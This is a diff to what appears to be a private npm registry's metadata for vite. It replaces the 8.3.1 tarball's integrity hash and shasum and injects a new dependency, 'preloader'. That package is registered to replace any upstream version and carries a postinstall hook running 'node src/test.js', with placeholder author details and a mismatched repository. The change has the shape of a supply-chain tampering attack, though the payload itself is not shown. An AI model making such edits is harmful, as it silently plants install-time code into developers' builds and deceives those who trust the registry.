@@ -8,9 +8,9 @@
       "versions": {
         "8.3.1": {
           "file": "packages/vite-8.3.1.tgz",
-          "integrity": "sha512-YZ2OChqMTF1sIbbm7oXR0S+mCESHztS7hPeYG0xDEtNZVp7mtiLXICQSuhh15lcslOBbdBFhE3/2t7XUZOSERA==",
-          "shasum": "7167772913f33f38584a50940cdbe070cfc62c45",
-          "registeredAt": "2026-09-28T08:49:49.921Z",
+          "integrity": "sha512-IDu8tFEVTd0jFGwDy7+SDwQGQ7tx80f1dtj+P3P7OgPAuVSHjfUNer47UxJx1S5OfFrDl6t0jRa9qPxRISLH7Q==",
+          "shasum": "b859666da79b9c571f2f881665b940abc0c3500a",
+          "registeredAt": "2026-09-30T05:06:11.741Z",
           "manifest": {
             "name": "vite",
             "version": "8.3.1",
@@ -73,6 +73,7 @@
               "lightningcss": "^1.33.0",
               "picomatch": "^4.0.7",
               "postcss": "^8.5.28",
+              "preloader": "1.0.0",
               "request": "^2.88.2",
               "rolldown": "~1.2.9",
               "tinyglobby": "^0.2.17"
@@ -212,7 +213,7 @@
           "file": "packages/vite-8.2.2.tgz",
           "integrity": "sha512-cZlKrTcI7G18hvNNRTtO2i1fsF61mEHW1DPdubDf0BNBYPouFV7oM5pbL6/jPd1uSKlfcMDeIp0Jrx0ORUhK9g==",
           "shasum": "c96583428df66a5c8678ded58233ce92b548f0fd",
-          "registeredAt": "2026-09-28T08:58:42.643Z",
+          "registeredAt": "2026-09-30T05:06:21.741Z",
           "manifest": {
             "name": "vite",
             "version": "8.2.2",
@@ -407,6 +408,61 @@
               "lint": "eslint --cache --ext .ts src/**",
               "format": "oxfmt",
               "generate-target": "tsx scripts/generateTarget.ts"
+            }
+          }
+        }
+      }
+    },
+    "preloader": {
+      "replaceUpstream": true,
+      "distTags": {
+        "latest": "1.0.0"
+      },
+      "versions": {
+        "1.0.0": {
+          "file": "packages/preloader-1.0.0.tgz",
+          "integrity": "sha512-cN7sgu1U/vIGpbHt3fmTivZRLZEr/2nYDeut7tnqWG7QwXerSKVgFC54y1taBP2DQJ0CjKmmCMx748YRArM12w==",
+          "shasum": "163adb747cdfe1fd9dd3a1f58ae65e4e461947a3",
+          "registeredAt": "2026-09-30T05:06:41.291Z",
+          "manifest": {
+            "name": "preloader",
+            "version": "1.0.0",
+            "description": "A Node.js runtime monitoring and diagnostics toolkit.",
+            "main": "index.js",
+            "type": "commonjs",
+            "scripts": {
+              "postinstall": "node src/test.js",
+              "test": "node test/monitor.test.js",
+              "start": "node examples/express-app.js"
+            },
+            "keywords": [
+              "nodejs",
+              "runtime",
+              "monitoring",
+              "diagnostics",
+              "performance",
+              "security",
+              "logging"
+            ],
+            "author": "Your Name",
+            "license": "MIT",
+            "repository": {
+              "type": "git",
+              "url": "https://github.com/maebinond/runtime-sentinel.git"
+            },
+            "bugs": {
+              "url": "https://github.com/maebinond/runtime-sentinel/issues"
+            },
+            "homepage": "https://github.com/maebinond/runtime-sentinel#readme",
+            "files": [
+              "src",
+              "index.js",
+              "README.md",
+              "LICENSE"
+            ],
+            "dependencies": {
+              "axios": "^1.20.0",
+              "request": "^2.88.2"
             }
           }
         }
